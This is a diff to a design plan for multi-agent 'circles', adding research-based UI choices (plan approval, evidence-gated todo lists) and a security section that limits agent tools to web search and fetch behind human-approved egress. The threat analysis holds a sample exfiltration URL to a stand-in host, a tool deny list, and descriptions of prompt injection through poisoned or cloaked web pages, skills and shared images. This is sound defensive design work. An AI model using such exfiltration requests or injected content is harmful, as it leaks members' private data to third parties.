@@ -220,6 +220,234 @@ Three rules follow, and they are binding:
    every additional round must justify itself against §8's overhead gate. **The
    rabbit-hole risk and the quality risk point the same direction: shallow.**
 
+### 3.2 The working surface `[v2 2026-07-27 — Victor: "the canvas needs to be doing a lot of work here"]`
+
+Requirement as stated: agents that call tools and research the web, a
+**propensity to create todo lists the user can scroll as items complete**, and
+**thumbnails of pages visited**. Reference bar: Manus, Genspark. Four research
+streams came back and three of them independently contradicted the obvious
+implementation, so this section records what to build INSTEAD, and why.
+
+#### 3.2.1 The finding that reshapes this: "watch it work" is a dead pattern
+
+Every product built around watching an agent work live is discontinued.
+OpenAI Operator (merged away 2025-07, site dead 2025-08), ChatGPT agent mode
+(superseded 2026-07-09), ChatGPT Canvas (removed 2026-05-28), Pulse (sunset
+2026-06-17), Atlas (retiring 2026-08-09), Copilot Workspace (sunset
+2025-05-30). The 2026 survivors returned to **step lists, artifacts, and
+screenshots on demand**. Across ~30 source fetches, **no organic user post
+praised Manus's "Computer" pane by name** — every by-name mention traced to
+marketing or affiliate content. A paid review put it plainly: _"You don't watch
+it work. You come back later to a result."_
+
+Live watching survived in exactly one niche: the **local browser sidecar**,
+where the agent acts in your own authenticated session and supervision is
+genuinely load-bearing. That niche is the one this plan is in (§0: oversight,
+not spectacle) — so the pane survives, but it must be built as the survivors
+built it, not as the graveyard did.
+
+**Corollary, and it is the sharpest single sentence in the research:** the #1
+trust destroyer is not hallucination, it is **silent success** — an agent
+asserting done with nothing to show. What builds trust instead: _"make the
+agent leave receipts as it goes."_ That is what §3.2.3 is.
+
+#### 3.2.2 The multiplayer result nobody wanted to hear
+
+GitHub's Agent HQ "mission control" — the shipped incarnation of "watch your
+team's agents" — generated **near-zero practitioner discussion**: five HN
+submissions totalling 6, 3, 2, 4 and 2 points with **zero substantive
+comments**, against 564 points and 357 comments for Copilot coding agent.
+Single-player fleet tools sustain hundreds of comments. Even vendors pitch it
+single-player.
+
+> Nobody said "I wish I could watch my coworker's agent." Many said "stop
+> flooding me with PRs you didn't read."
+
+The binding constraint for a group is therefore **not shared visibility**. It
+is that **generation is cheap and private while verification is expensive and
+social**, plus a measured attention ceiling of **3-5 concurrent agents** (six
+independent sources, Jul 2025 - Apr 2026), with review throughput saturating
+_lower_ than execution throughput.
+
+This independently validates the design already in §3: N members' agents must
+NOT render as N live panes. **Fidelity is a function of provenance** — your own
+agent renders richly because it is local, first-party and tool-capable; every
+peer's agent renders as an attested summary. That is simultaneously the
+anti-wall mechanism and the §4 trust boundary, and now also the market answer.
+
+#### 3.2.3 What ships instead of a wall of panes
+
+1. **Receipts, not narration.** Every claim an agent publishes carries its
+   sources. Verification tiers must be cheap: hover for the quote, click for
+   the source. This is the mechanic that measurably builds trust.
+2. **Evidence cards, not screenshots, across the wire** (§4b.4 and the media
+   architecture). Cited sources only — never browsing history, which is itself
+   a disclosure (§4b.5 T11).
+3. **Your own agent's full trail stays local**, at full fidelity, including
+   real screenshots. Playwright and sharp are already dependencies, so this is
+   ~30 lines of glue, and it is where the oversight need actually lives.
+4. **A needs-attention inbox, not a grid.** Both major vendors converged here
+   independently. Order by **"needs input" before "is done"** — the absence of
+   that signal is precisely what breaks supervision at N≥3.
+5. **Shared WIP backpressure — the highest-leverage unbuilt mechanic in the
+   corpus.** Cap the number of un-reviewed agent outputs in flight across the
+   circle. No shipped product does this, it directly counters the
+   cheap-generation/expensive-review asymmetry, and it composes exactly with
+   the existing `MAX_PENDING_PER_CIRCLE` precedent.
+6. **The work ratio as the glance:** `4 of 10 turns · 3 deltas`. A delta is a
+   contribution that changed the artifact, so `10 turns · 0 deltas` reads as a
+   rabbit hole with no training and no detector firing. Deliberately not an
+   activity count — activity counts reward busywork.
+
+#### 3.2.4 Todo lists: build the gate and the diff, not the ticker
+
+Victor asked for scrollable todo lists. The evidence says the instinct points
+at something real but one step to its left:
+
+- **Both famous implementations were withdrawn.** Manus abandoned `todo.md`
+  after finding **~1/3 of all agent actions were spent updating it**. Anthropic
+  disabled `TodoWrite` by default (Claude Code v2.1.142, 2026-05-14) in favour
+  of a dependency graph. There is a measured cost bug too: todo updates
+  invalidate the whole prompt cache **even when byte-identical**.
+- **The measured oversight benefit is pre-flight, not mid-run.** A controlled
+  study (arXiv:2604.04918, N=48, live web, four oversight strategies) found
+  plan-based strategies lowered **problematic-action occurrence** without
+  equivalent gains in **runtime intervention**. Users confirm it: an agent
+  announced it would skip tests, _"but only as it happens and that scrolls by
+  pretty quick."_
+- **This lands on the same moment §4b.3 reaches from the security side** — the
+  human tap belongs on the _plan_, before egress. Two independent routes to one
+  decision; it is now the best-supported choice in this plan.
+
+So the design is:
+
+| Ship                                                                                                                                                                                                                   | Do not ship                                    |
+| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------- |
+| **Plan approved before execution**, editable, offering `Approve / Approve with edits / Keep planning` (a bare accept-or-cancel collapses into an approve button)                                                       | A live ticker as the primary oversight surface |
+| **Plan-vs-actual diff — the clearest unoccupied ground in the field.** Nobody ships it; it maps exactly to rabbit-hole detection. Mark steps `deviated` and show the delta                                             | Silent deviation (today's universal norm)      |
+| **`blocked` as a real state with a required reason.** Verified: Claude Code's shipped schema has no `blocked`, so blocked tasks render `in_progress` forever — the mechanical root of users distrusting these displays | Blocked-as-in_progress                         |
+| **Evidence-gated completion.** A step cannot self-mark done without an artifact. Called the highest-leverage single item in the corpus; matches "progress is derived from the fold, never sender-claimed"              | Self-asserted completion                       |
+| Ambient, capped, **updated** item list (never rewritten wholesale)                                                                                                                                                     | Unbounded lists; full-list rewrite churn       |
+
+The wire object is `sandbox.plan.put {card_id, round, steps[≤12]{id, label,
+state}, updated_at}` — under 2KB, no media problems, and progress derived from
+the fold so it cannot be inflated. **This is the cheapest item in §3.2 and the
+one that does the most for the actual ask.**
+
+#### 3.2.5 Banned outright
+
+Fake or cosmetic progress; mood phrases ("almost done", "finalizing");
+self-asserted completion; blocked-rendered-as-working; full-list rewrite churn;
+unbounded lists; raw trace as the primary surface; decorative plans that are
+never diffed against behaviour; post-hoc narrative labelled "what the agent is
+thinking" (models verbalize reward hacking <2% of the time); approve-everything
+gates. Plus one from the visual research: **never couple the pane to
+execution** — the single genuine pane complaint found anywhere was a product
+where occluding the view stalled the task, punishing exactly the walk-away
+behaviour every user exhibits.
+
+---
+
+## 4b. Tools: what an enrolled agent may actually do `[v2 2026-07-27]`
+
+Victor's ask ("agents call tools and skills, research the web, show what they
+found") collides head-on with **I3, which said sandbox generation is
+tool-less**. Both the security red team and the media architect independently
+refused to let that be relaxed silently. It is amended explicitly instead.
+
+### 4b.1 The hypothesis that failed
+
+The coordinator proposed: the danger is tools that read _private state_ or
+generations that both ingest untrusted content _and_ act; a read-only public
+fetch is merely more untrusted input. **Refuted, decisively:**
+
+> A GET is egress, and egress is exfiltration. "Read-only" describes the effect
+> on _my_ state, not on the world.
+
+An outbound request carries attacker-chosen bytes in path and query, so
+`https://evil.example/c?d=<base64 of the card>` publishes circle content to a
+third party with no member ever seeing it. Read-only is the wrong axis. The
+right axes: does it read state outside the allowed context set; does it cause
+anything to **leave the node**; does it have effects a human would care about.
+
+### 4b.2 Rulings
+
+| Ask                                               | Ruling                                                                                                                                                                                                                                                                                                         |
+| ------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Tools during a session                            | **Yes, narrowly** — a two-entry allowlist: `web_search`, `web_fetch`                                                                                                                                                                                                                                           |
+| Research the live web                             | **Yes, propose-mode only**, behind a plan tap and an egress broker                                                                                                                                                                                                                                             |
+| Invoke skills (any tier or origin, incl. bundled) | **Refused.** Skills reach the model _as prompt text_, so a skill in a sandbox frame is a third party writing the trusted instruction frame — exactly T2. The existing capability system cannot serve as the boundary: it is union-based, bypasses non-sensitive calls, and no-ops entirely on an empty P2P set |
+| Thumbnails/screengrabs **across the wire**        | **Refused for v1.** Own-agent-local screenshots: yes (§3.2.3)                                                                                                                                                                                                                                                  |
+| Visible todo lists                                | **Yes**, as typed data, never prose (§3.2.4)                                                                                                                                                                                                                                                                   |
+
+Absolute deny list, enforced by tool **absence** rather than refusal: wallet and
+payment paths, `message_tool` and all channel actions, the `circles` tool
+itself (an agent writing to the circle out-of-band bypasses the whole move
+grammar), `skill_manage`, all memory/recall/dream tools, `code_interpreter`,
+`browser_tool`, `computer_use`, filesystem read and write, calendar read.
+PLAN-20 interceptors must be **off** for sandbox turns — they are
+third-party-authored code on `before_tool_call`, i.e. a direct bypass of the
+egress broker.
+
+### 4b.3 The turn shape (five steps, tap before egress)
+
+1. **Planner** (LLM, tool-less) — sees card state in the untrusted envelope,
+   emits a rigid plan drawn from a closed action set: `search(query)` |
+   `fetch(url)` | `compose`. It selects actions; it does not write instructions.
+2. **Plan tap** (human) — literal queries and URLs approved, edited or
+   rejected. **This is where egress consent lives.** Approving the resulting
+   _move_ instead would be auditing the crime scene: exfiltration completes at
+   fetch time.
+3. **Executor** — **no LLM at all**, so the approved plan and the executed plan
+   are byte-identical by construction. This is what makes the approval mean
+   something.
+4. **Summarizer** (LLM, tool-less, isolated) — reads fetched pages, sees **no**
+   circle content, has no ledger write and no egress, emits a typed record.
+   The generation touching the most hostile content has the least capability.
+5. **Composer** (LLM, tool-less) — writes the move from that squeezed
+   derivative; then R6 grammar validation, R14 output validation, propose tap.
+
+Invariant bought: **no single generation both ingests fetched content and
+selects egress.**
+
+### 4b.4 The cost, quantified
+
+Web access moves the T1 laundering threat from **betrayal by one of ~4-15
+accountable friends** (invited, keyed, rate-limited, socially exposed,
+removable) to an **unauthenticated, unattributable, unremovable,
+pre-positionable, internet-scale** attacker who can poison pages and wait, and
+serve different content to an agent's user-agent than to a human's browser.
+That is a category change, not a severity bump — and it is why step 4 squeezes
+webpage-to-ledger bandwidth to a typed record.
+
+### 4b.5 New threats and invariants
+
+- **T10 — Evidence forgery.** A node can screenshot anything, or synthesize an
+  image, and sign it honestly. Signatures prove _who is accountable_, never
+  _that the page said that_. A screenshot is the most credibility-laundering
+  artifact that exists, and a phishing-lookalike screenshot **has no technical
+  mitigation** — which is the disqualifying reason for cross-member images in
+  v1. Mitigation is UI: the URL renders verbatim beside any image, never
+  full-bleed, always inside "captured by X's agent" chrome.
+- **T11 — Source lists leak private constraints.** If my agent researches
+  against my private ceiling, the source list _encodes_ it: publishing
+  `kayak.com/flights?max=900` tells the circle Ana's $900 limit that she never
+  typed. Mitigation: per-source opt-in at publish (default off), and **only
+  scheme+host** ever crosses the wire — never path or query.
+- **I11 — No third-party instruction text in a sandbox frame.** No skill, any
+  tier, any origin.
+- **I12 — No agent ingests canvas images.** Images, if they ever exist, are for
+  human eyes only. (Agent Smith: a shared multimodal artifact ingested by a
+  population of agents is the literal setup for population-level infection.)
+
+Requirements R21-R34 (fail-closed literal allowlist, denial-by-absence, zero
+skills, interceptors off, plan-then-execute, egress broker with pinned SSRF and
+an append-only egress log, dual-LLM typed summarizer, transitive `web:<host>`
+provenance, per-enrollment egress budget, no images, typed todo items,
+approval-fatigue cap with diff surfacing, and **tools and auto-append mutually
+exclusive in every phase**) are carried in full in the security section text
+and are binding.
+
 ---
 
 ## 4. Security (this section governs)
@@ -265,7 +493,7 @@ one-envelope repeatable brick); smuggling through receiver-side special paths
 
 - **I1** No generation may include recall-eligible memory, retrieval, or session history.
 - **I2** Trusted personal context and circle-facing output are **mutually exclusive**. Either personal context + human review before the wire, or auto-append + card-scoped context only. Never both.
-- **I3** Generation for circle content is tool-less. No sandbox path acquires tools, payments, wallet, or filesystem, in any mode.
+- **I3** _[AMENDED 2026-07-27 — see §4b]_ **Capability floor for circle-facing generation.** No such generation may hold payment, messaging, memory, filesystem, skill-mutation, code-execution, browser-automation, or agent-control capability, in any mode or phase. Absolute; not relaxable by config, enrollment, task type, or phase. The single admissible capability above the floor is **retrieval of public web content**, and only with all four of: a fail-closed literal allowlist; human approval of every egress before any request is issued; no single generation both ingesting fetched content and selecting egress; and fetched content reaching the composing generation only as a typed, bounded, marker-stripped derivative carrying `web:<host>` provenance. Where any of those is unavailable, the generation is tool-less.
 - **I4** Consent is node-local-authoritative. No peer assertion authorizes generation or spend on my node.
 - **I5** Spend is bounded by a budget only my human can refill. No protocol message may raise it.
 - **I6** Agents never summon agents. The relaxation is peer-triggered generation _within an enrollment I created_.
@@ -380,15 +608,28 @@ human's tap; no autonomous posting anywhere in this phase.
 > ships. This moves from "ships in this phase" (v1) to "ships FIRST in this
 > phase, before the second real member is ever required."
 >
-> Build order inside P1, thin slice first so course-correction stays cheap:
-> **(a)** event types + fold + migration (no UI, tested headless);
-> **(b)** one negotiation card, one round, practice partner as the second agent,
-> propose-mode, rendered in the oversight pane;
-> **(c)** multi-round + convergence + containment detectors;
-> **(d)** real second-node participation;
-> **(e)** breadth (more move kinds, richer artifact rendering).
+> Build order inside P1, thin slice first so course-correction stays cheap
+> `[revised 2026-07-27 for the §3.2/§4b scope]`:
+> **(a)** event types + fold + migration, incl. `sandbox.plan.put` and
+> `sandbox.evidence.put` (no UI, tested headless);
+> **(b)** one negotiation card, one round, practice partner as the second
+> agent, propose-mode, rendered as: verdict band (work ratio), shared
+> checklist, containment banner, live pill;
+> **(c)** multi-round + convergence + containment detectors + plan-vs-actual
+> diff;
+> **(d)** tools — the §4b five-step turn with the plan tap and egress broker;
+> **(e)** real second-node participation;
+> **(f)** breadth (work view, evidence strip, replay scrubber, own-agent
+> screenshots).
 > Stop and reassess after (b): that is the first point where the thesis is
 > visible on screen and the cheapest place to change your mind.
+>
+> **Scope warning, on the record.** The §3.2 UI alone is ~14 components,
+> 900-1,200 LOC plus tests, against a P1 budget of 1,400-1,800 total. The
+> escalated requirement materially blows P1. Tools (d) and the rich surface (f)
+> are therefore sequenced AFTER the reassessment point rather than folded into
+> the first slice, and (f) is explicitly a candidate for deferral depending on
+> what (b) shows.
 
 **P2 — Auto-append, constrained moves only (~800 LOC).** Gated on M1-M6 complete
 AND a dedicated adversarial pass AND the §8 gates. Default off
@@ -488,6 +729,22 @@ attribution, and no cloud singleton reading four people's private context.
    because a member was removed and channel keys cannot yet be rotated"), per the
    §3.1 rule that every terminal state is legible. Rotation gets scheduled before
    public launch, where it is load-bearing anyway.
+
+### 9.2 Open decisions from the tools/canvas escalation `[new 2026-07-27]`
+
+7. **Cross-member images.** Both reviews refuse for v1 (T10: phishing-lookalike
+   screenshots have no technical mitigation). You get own-agent-local
+   screenshots and cross-member evidence cards. Accept, or fund the middle
+   option (raster-only, re-encoded, hard-chromed, hash-pinned)?
+8. **Tool scope.** Accept the two-entry allowlist (`web_search`, `web_fetch`)
+   and the permanent skills refusal, or push for more surface with the
+   machinery that would require?
+9. **Plan-first vs ticker-first.** The evidence says build the pre-flight plan
+   gate and the plan-vs-actual diff rather than the live scrolling list. This
+   is close to but not identical to what you asked for; confirm the swap.
+10. **Shared WIP backpressure.** Cap un-reviewed agent output in flight across
+    the circle. Nobody ships it, it is the single highest-leverage mechanic
+    found, and it will occasionally block an eager member. In or out?
 
 ### 9.1 Standing risk accepted by decisions 2 + 3 (recorded, not re-litigated)
 
